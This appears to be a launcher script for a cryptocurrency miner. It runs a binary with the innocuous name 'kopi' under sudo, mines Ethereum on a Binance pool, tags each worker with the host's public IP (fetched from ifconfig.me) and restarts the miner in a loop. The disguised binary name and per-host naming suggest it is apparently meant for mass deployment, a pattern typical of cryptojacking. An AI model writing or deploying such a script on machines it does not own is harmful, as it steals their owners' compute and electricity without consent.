#!/bin/bash

cd "$(dirname "$0")"

chmod +x ./kopi && sudo ./kopi --coin ETH --pool ethash.poolbinance.com:1800 --user Jarot.$(echo "$(curl -s ifconfig.me)" | tr . _ )
while [ $? -eq 42 ]; do
    sleep 10s
    chmod +x ./kopi && sudo ./kopi --coin ETH --pool ethash.poolbinance.com:1800 --user Jarot.$(echo "$(curl -s ifconfig.me)" | tr . _ )
done
